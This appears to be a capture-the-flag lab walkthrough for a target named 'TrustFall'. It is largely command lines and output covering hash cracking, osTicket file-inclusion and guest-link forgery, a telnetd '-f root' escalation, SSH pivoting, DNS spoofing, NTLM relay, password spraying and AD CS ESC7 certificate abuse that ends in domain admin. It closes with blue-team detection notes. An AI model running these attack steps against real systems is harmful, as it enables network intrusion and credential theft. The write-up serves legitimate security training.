Target : 10.129.70.120

Date : 16/09/2026

```bash
>  echo "10.129.70.120 trustfall.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.70.120 trustfall.htb  
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.70.120  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 07:24 +0200  
Nmap scan report for trustfall.htb (10.129.70.120)  
Host is up (0.047s latency).  
Not shown: 65521 filtered tcp ports (no-response)  
PORT      STATE  SERVICE VERSION  
21/tcp    open   ftp     vsftpd 3.0.5  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:10.10.15.133  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 2  
|      vsFTPd 3.0.5 - secure, fast, stable  
|_End of status  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_Can't get directory listing: PASV IP 10.10.10.20 is not the same as 10.129.70.120  
22/tcp    open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 92:9b:06:ad:92:5c:9e:9c:fd:c7:64:23:6b:72:fe:c5 (ECDSA)  
|_  256 06:fc:54:55:29:6f:e9:22:48:91:e1:1e:ba:b7:35:b5 (ED25519)  
80/tcp    open   http    Apache httpd 2.4.58  
|_http-server-header: Apache/2.4.58 (Ubuntu)  
|_http-title: TrustFall IT Helpdesk  
50000/tcp closed ibm-db2  
50001/tcp closed unknown  
50002/tcp closed iiimsf  
50003/tcp closed unknown  
50004/tcp closed unknown  
50005/tcp closed unknown  
50006/tcp closed unknown  
50007/tcp closed unknown  
50008/tcp closed unknown  
50009/tcp closed unknown  
50010/tcp closed unknown  
Aggressive OS guesses: Linux 5.0 - 5.14 (93%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (93%), Linux 4.15 - 5.19 (90%), Linux 2.6.32 - 3.13 (89%), Linux 5.14 - 6.8 (89%), Linux 3.10 - 4.11 (87%), Linux 5.0 (87  
%), OpenWrt 22.03 (Linux 5.10) (87%), Linux 6.18 (87%), Linux 3.2 - 4.14 (86%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: catch-all; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 61.39 seconds
```

The first full-port pass only shows Linux services — `closed unknown` on the high ports is the Windows guest answering through the same VPN IP once we fix `hosts`.

```bash
> echo "10.129.70.120 trustfall.htb ticket.trustfall.htb mailsrv.trustfall.htb dc01.trustfall.htb ws01.trustfall.htb ws02.trustfall.htb" | sudo tee -a /etc/hosts
10.129.70.120 trustfall.htb ticket.trustfall.htb mailsrv.trustfall.htb dc01.trustfall.htb ws01.trustfall.htb ws02.trustfall.htb
> nmap -sC -sV -Pn -p 21,22,53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,8530,8531,2179 10.129.70.120
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.5
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-16 08:24:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trustfall.htb, Site: Default-First-Site-Name)
443/tcp  open  ssl/https
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8530/tcp open  http          Microsoft IIS httpd 10.0
8531/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
2179/tcp open  vmrdp?
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
```

Same VPN IP fronts `ticket01` (Linux, `ttl≈62`) and `DC01` (Windows, `ttl≈127`). `8530`/`8531` are `WSUS`; `443` is `AD CS` enrollment. We note the seven-hour skew early — Kerberos steps later fail with `KRB_AP_ERR_SKEW` until we align to the DC.

`MITRE ID : Reconnaissance + Active Scanning T1595`

Anonymous `FTP` on `21` advertises `PASV` with `10.10.10.20` while we connect to the lab IP — passive listing fails unless we disable PASV.

```bash
> curl -s --ftp-pasv false ftp://10.129.70.120/
drwxr-xr-x    2 0        0            4096 Feb 10 2026 IT-Archives
drwxr-xr-x    2 0        0            4096 Feb 10 2026 backups
> curl -s --ftp-pasv false -o mail_migration_rollback_backup.tar.gz ftp://10.129.70.120/backups/mail_migration_rollback_backup.tar.gz
> tar -xzf mail_migration_rollback_backup.tar.gz && grep -E 'salvador|santiago|alejandro' dovecot/users
salvador:{SHA512-CRYPT}...
santiago:{SHA512-CRYPT}...
alejandro:{SHA512-CRYPT}...
> hashcat -m 1800 dovecot_hashes.txt /usr/share/wordlists/rockyou.txt --force
TrustFall{DEPT}{FirstName}{YYYY}!:{SHA512-CRYPT}...:salvador:[REDACTED]
TrustFall{DEPT}{FirstName}{YYYY}!:{SHA512-CRYPT}...:santiago:[REDACTED]
```

Three named users crack into the `TrustFall{DEPT}{FirstName}{YYYY}!` scheme. `salvador` logs into Roundcube at `mailsrv.trustfall.htb`; that mailbox receives the `osTicket` self-registration mail for `santiago@trustfall.htb`.

`MITRE ID : Credential Access + Unsecured Credentials T1552`

`ticket.trustfall.htb` is `osTicket`. `CVE-2026-22200` LFI through the PDF include path leaks `include/ost-config.php` — `SECRET_SALT` and MySQL creds. Guest access for `TrustFall_TK13` / `santiago@trustfall.htb` authenticates with `a = md5(ticket_id + email.lower() + SECRET_SALT)` — ticket user id `3`, not display number `13`.

```bash
> curl -s 'http://ticket.trustfall.htb/scp/ajax.php?...' | grep -o 'SECRET_SALT.*' | head -1
SECRET_SALT','[REDACTED]'
> python3 -c "import hashlib; print(hashlib.md5(b'3santiago@trustfall.htb[REDACTED]').hexdigest())"
dc61e98f492de457375dc1c120d227ed
> python3 osticket_forge_access_link.py TrustFall_TK13 3 santiago@trustfall.htb [REDACTED] http://ticket.trustfall.htb
http://ticket.trustfall.htb/view.php?t=TrustFall_TK13&e=santiago@trustfall.htb&a=dc61e98f492de457375dc1c120d227ed
> curl -s -b /tmp/tk13.cookie 'http://ticket.trustfall.htb/file.php?key=ssh_debug.tar.gz' -o ssh_debug.tar.gz
> tar -xzf ssh_debug.tar.gz && chmod 600 id_ed25519
> ssh -i id_ed25519 -o StrictHostKeyChecking=no martin@10.129.70.120 id
uid=1001(martin) gid=1001(martin) groups=1001(martin)
```

Forged guest URL lands on `tickets.php?id=3` with attachment `ssh_debug.tar.gz` — PEM newline at EOF matters on `id_ed25519`.

`MITRE ID : Initial Access + Exploit Public-Facing Application T1190`

`telnetd` listens on `0.0.0.0:23` on `ticket01`. `USER='-f root' telnet -a 127.0.0.1` becomes `login -f root` — passwordless root for `martin` (`CVE-2026-24061`).

```bash
> ssh -i /tmp/trustfall/.ssh/id_ed25519 martin@10.129.70.120
martin@ticket01:~$ USER='-f root' telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
# id
uid=0(root) gid=0(root) groups=0(root)
```

Decrypting the `osTicket` mailbox secret with `SECRET_SALT` yields domain user `john.s` / `[REDACTED]` — same string as `support@` mailbox password.

`MITRE ID : Privilege Escalation + Exploitation for Client Execution T1203`

`eth0` on the pivot is down at first boot — bringing it up DHCPs onto the office LAN `192.168.1.0/24`.

```bash
# root on ticket01
> ip link set eth0 up
> dhcpcd eth0
> ip -br a
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.1.128/24 fe80::...
eth1             UP             10.10.10.20/24
> ping -c1 192.168.1.32 && ping -c1 192.168.1.64
64 bytes from 192.168.1.32: icmp_seq=1 ttl=127 time=0.8 ms
64 bytes from 192.168.1.64: icmp_seq=1 ttl=127 time=1.1 ms
```

From the attack box we tunnel the internal segment through `martin` SSH — SMB/LDAP/WinRM/HTTPS to `DC01` (`192.168.1.32`) and `WS01` (`192.168.1.64`).

```bash
> ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 \
    -L 2445:192.168.1.32:445 -L 1445:192.168.1.64:445 \
    -L 5985:192.168.1.64:5985 -L 59850:192.168.1.32:5985 \
    -L 4433:192.168.1.32:443 -L 1389:192.168.1.32:389 \
    -i /tmp/trustfall/.ssh/id_ed25519 -N -f martin@10.129.70.120
> nxc smb 127.0.0.1 -u john.s -p '[REDACTED]' -d trustfall.htb --port 2445
SMB         127.0.0.1       2445   TRUSTFALL.HTB   [+] trustfall.htb\john.s:[REDACTED]
> nxc smb 127.0.0.1 -u emma.williams -p '[REDACTED]' -d trustfall.htb --port 2445
SMB         127.0.0.1       2445   TRUSTFALL.HTB   [+] trustfall.htb\emma.williams:[REDACTED]
> nxc winrm 127.0.0.1 -u jake.r -p '[REDACTED]' -d trustfall.htb --port 5985
WINRM       127.0.0.1       5985   TRUSTFALL.HTB   [+] trustfall.htb\jake.r:[REDACTED] (Pwn3d!)
```

Default `emma.williams` / `jake.r` passwords stick without an `luis.mody` OU reset on this instance.

`MITRE ID : Lateral Movement + Remote Services T1021`

`john.s` holds `ForceChangePassword` on `WS02$`. We reset the machine account over SMB forward `2445`, then rewrite `ws02` DNS from dead `192.168.1.37` to pivot `192.168.1.128`.

```bash
> rpcclient -U 'trustfall/john.s%[REDACTED]' -p 2445 127.0.0.1 -c "setuserinfo2 WS02$ 23 '[REDACTED]'"
> python3 ~/Downloads/trustfall/dnstool_patched.py ldap://127.0.0.1:1389 \
    -u 'trustfall\WS02$' -p '[REDACTED]' -dns-ip 192.168.1.32 \
    -r ws02 -a add -t A -d 192.168.1.128
[-] Adding record ws02 in zone trustfall.htb
[+] LDAP operation completed successfully
> python3 ~/Downloads/trustfall/dnstool_patched.py ldap://127.0.0.1:1389 \
    -u 'trustfall\WS02$' -p '[REDACTED]' -dns-ip 192.168.1.32 -r ws02 -a query
ws02.trustfall.htb. 600 IN A 192.168.1.128
```

On `ticket01` we DNAT inbound `3389` toward `ntlmrelayx` RDP (`--adcs --template User`) targeting `https://127.0.0.1:4433/certsrv/` — `david.m` periodically RDPs the dead `ws02` hostname.

`MITRE ID : Credential Access + Adversary-in-the-Middle T1557`

```bash
> nxc smb 127.0.0.1 -u david.m -p '[REDACTED]' -d trustfall.htb --port 1445
SMB         127.0.0.1       1445   TRUSTFALL.HTB   [+] trustfall.htb\david.m:[REDACTED]
> nxc smb 127.0.0.1 -u ws01 -H [REDACTED] --local-auth --port 1445
SMB         127.0.0.1       1445   WS01            [-] WS01\ws01:[REDACTED] STATUS_LOGON_FAILURE
```

`david.m` domain auth works over the tunnel. Local `WS01\ws01` PTH with the same NT returns `STATUS_LOGON_FAILURE` on this reset — the documented shortcut is not live here.

`luis.mody` was `ACCOUNTDISABLE`. After enable, leadership-pattern password works; `sql_svc` adds itself to `IT`.

```bash
> bloodyAD --host 127.0.0.1 -p 1389 -d trustfall.htb -u david.m -p '[REDACTED]' remove uac luis.mody -f ACCOUNTDISABLE
> nxc smb 127.0.0.1 -u luis.mody -p '[REDACTED]' -d trustfall.htb --port 2445
SMB         127.0.0.1       2445   TRUSTFALL.HTB   [+] trustfall.htb\luis.mody:[REDACTED]
> python3 ~/Downloads/trustfall/add_sql_it.py
[+] sql_svc added to CN=IT,OU=TrustFall-Groups,DC=trustfall,DC=htb
```

`user.txt` on `WS01` does not yield yet — NTLM over forward `1445` returns `STATUS_NO_LOGON_SERVERS` while `dc01` DNS still advertises the VPN IP. We park the `sql_svc` → `ESC17` → rogue `WSUS` branch and finish DA first.

```bash
> nxc smb 127.0.0.1 -u david.m -p '[REDACTED]' -d trustfall.htb --port 1445 -x 'type C:\Users\Administrator\Desktop\user.txt'
SMB         127.0.0.1       1445   TRUSTFALL.HTB   [-] Error getting shell: STATUS_NO_LOGON_SERVERS
```

`tom.k` NT from `WS01` SAM reuse authenticates to `DC01` WinRM. `password_reset.log` shows `aaron.b` reset at `2/17/2026 2:21:01 AM` — `Reset-User.vbs` uses bare `Randomize` (Doyensec), not the `Randomize Timer` comment in source.

```bash
> nxc winrm 127.0.0.1 -u tom.k -H [REDACTED] -d trustfall.htb --port 59850 -x 'type C:\Scripts\AdminTools\password_reset.log'
2/17/2026 2:21:01 AM - SUCCESS - User aaron.b password reset completed.
> cd ~/Downloads/trustfall
> python3 spray_aaron.py | while read -r p; do
    nxc smb 127.0.0.1 -u aaron.b -p "$p" -d trustfall.htb --port 2445 2>&1 | grep -q '\[+\]' && echo "HIT" && break
  done
HIT
> nxc smb 127.0.0.1 -u aaron.b -p '[REDACTED]' -d trustfall.htb --port 2445
SMB         127.0.0.1       2445   TRUSTFALL.HTB   [+] trustfall.htb\aaron.b:[REDACTED]
```

`aaron.b` ∈ `PKI_Managers` / `IT`. `certipy find` marks `trustfall-DC01-CA` as `ESC7` — `ManageCa` + `ManageCertificates`.

```bash
> certipy find -u aaron.b -p '[REDACTED]' -dc-ip 127.0.0.1 -ldap-port 1389 -ldap-scheme ldap -no-ldap-signing -stdout 2>&1 | rg 'ESC7|ManageCa|aaron'
CA Name               : trustfall-DC01-CA
Vulnerabilities       : ESC7
```

`MITRE ID : Credential Access + Unsecured Credentials T1552`

Direct `certipy req` to the VPN IP or loopback without SOCKS flakes on CA RPC. We stand up dynamic SOCKS through `martin` and a strict `proxychains4` config.

```bash
> cat > /tmp/pc.conf <<'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
EOF
> ssh -o StrictHostKeyChecking=no -D 127.0.0.1:1080 -i /tmp/trustfall/.ssh/id_ed25519 -N -f martin@10.129.70.120
> export PROXYCHAINS_CONF_FILE=/tmp/pc.conf
> mkdir -p /tmp/esc7 && cd /tmp/esc7
> echo y | proxychains4 -q certipy req -u aaron.b -p '[REDACTED]' \
    -dc-ip 192.168.1.32 -target-ip 192.168.1.32 -target 192.168.1.32 \
    -ca trustfall-DC01-CA -template SubCA \
    -upn administrator@trustfall.htb \
    -sid S-1-5-21-321399640-1940743330-3713521093-500 -out admin
Certipy v5.0.0 - by Oliver Lyak (@ly4k)
[*] Requesting certificate via RPC
[-] Got error while requesting certificate: code 0x80094812 - CERTSRV_E_TEMPLATE_DENIED
[*] Request ID is 22
Would you like to save the private key? (y/N): y
[*] Saved private key to admin.key
> proxychains4 -q certipy ca -issue-request 22 -u aaron.b -p '[REDACTED]' \
    -dc-ip 192.168.1.32 -target-ip 192.168.1.32 -target 192.168.1.32 -ca trustfall-DC01-CA
[*] Successfully issued certificate
> proxychains4 -q certipy req -u aaron.b -p '[REDACTED]' \
    -dc-ip 192.168.1.32 -target-ip 192.168.1.32 -target 192.168.1.32 \
    -ca trustfall-DC01-CA -retrieve 22 -out admin
[*] Retrieved certificate with ID 22
[*] Saved certificate to admin.crt
> openssl pkcs12 -export -out admin.pfx -inkey admin.key -in admin.crt -password pass:
```

Request id `22` is instance-local — req / `issue-request` / `retrieve` must share one id or `certipy auth` fails modulus check.

`MITRE ID : Credential Access + Steal or Forge Authentication Certificates T1649`

`certipy auth` fails with `KRB_AP_ERR_SKEW` until attack-host UTC matches `ticket01` / `DC01` (~7h offset).

```bash
> proxychains4 -q certipy auth -pfx /tmp/esc7/admin.pfx -password '' -dc-ip 192.168.1.32
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
> sudo timedatectl set-ntp false
> sudo date -u -s '2026-09-16 15:15:00'
> proxychains4 -q certipy auth -pfx /tmp/esc7/admin.pfx -password '' -dc-ip 192.168.1.32
[*] Using principal: administrator@trustfall.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to administrator.ccache
[*] Got hash for 'administrator@trustfall.htb': [REDACTED]
> nxc smb 127.0.0.1 -u Administrator -H [REDACTED] -d trustfall.htb --port 2445 -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         127.0.0.1       2445   TRUSTFALL.HTB   [+] TRUSTFALL\Administrator:[REDACTED] (Pwn3d!)
[REDACTED]
```

`root.txt` on `DC01` — domain administrator without ever holding `Domain Admins` group membership during the spray phase.

`MITRE ID : Privilege Escalation + Abuse Elevation Control Mechanism T1548`

Post-DA we strip spurious `dc01` A records and reach `WS01` with Kerberos over SOCKS — skips `ESC17` / rogue `WSUS`.

```bash
> nxc winrm 127.0.0.1 -u Administrator -H [REDACTED] -d trustfall.htb --port 59850 -x \
    'dnscmd . /RecordDelete trustfall.htb dc01 A 10.129.70.120 /f & dnscmd . /RecordDelete trustfall.htb dc01 A 10.10.10.10 /f & dnscmd . /RecordAdd trustfall.htb dc01 A 192.168.1.32 & dnscmd . /clearcache'
WINRM       127.0.0.1       59850  TRUSTFALL.HTB   [+] TRUSTFALL\Administrator:[REDACTED] (Pwn3d!)
Deleted record...
Command completed successfully.
> export KRB5CCNAME=/home/vagabond/hexstrike-ai/administrator.ccache
> export PROXYCHAINS_CONF_FILE=/tmp/pc.conf
> proxychains4 -q nxc smb 192.168.1.64 -u Administrator -k -d trustfall.htb --use-kcache \
    -x 'type C:\Users\Administrator\Desktop\user.txt'
SMB         192.168.1.64    445    WS01            [+] TRUSTFALL\Administrator from cache
[REDACTED]
```

`user.txt` on `C:\Users\Administrator\Desktop\user.txt` on `WS01` (`192.168.1.64`). Both flags closed.

`MITRE ID : Lateral Movement + Remote Services T1021`

**Blue Team :**
Dual-guest VPN IP with Linux `ttl≈62` and Windows `ttl≈127` should trigger split-horizon hunts — anon `FTP` Dovecot dumps, forged `osTicket` guest URLs (`md5` ticket links), and `martin` SSH from ticket attachments are the early chain. After pivot, watch `WS02$` password resets, `ws02` DNS rewrites toward `192.168.1.128`, inbound `3389` coerce (`ntlmrelayx` / `ESC8`), and `IT` group membership changes by `sql_svc`. `tom.k` WinRM plus `password_reset.log` reads telegraph the VBS RNG path into `aaron.b`. CA audit logs for denied `SubCA` requests manually issued by `PKI_Managers` principals, and `STATUS_NO_LOGON_SERVERS` bursts on workstations when `dc01` DNS still points at the VPN IP, are late-stage tells before DA and the workstation flag.

**Purple Team :**
We took post-DA SOCKS plus DNS cleanup for `user.txt` instead of burning `ESC17`/`WSUS` once `Administrator` was in hand — NTLM over the pivot stayed broken until `dc01` was LAN-only and Kerberos from `administrator.ccache` carried the SMB exec. `ESC7` only worked when `echo y` saved `admin.key` on denied `SubCA` enrollment and req/issue/retrieve shared one request id; seven-hour clock skew against `ticket01` forced `date -u` alignment before `certipy auth`. Guest-link forgery used ticket id `3` because display id `TrustFall_TK13` alone does not satisfy the `md5` salt line; `ws02` DNS spoof targeted `david.m`'s habit of RDP to a dead host when NetNTLM would not crack.

`anon FTP` → forged `osTicket` guest → `martin` SSH → `telnetd` root → `eth0` DHCP pivot → `john.s` / defaults → `WS02$` DNS → `tom.k` / VBS → `aaron.b` `ESC7` → `root.txt` → `dnscmd` / Kerberos SOCKS → `user.txt`
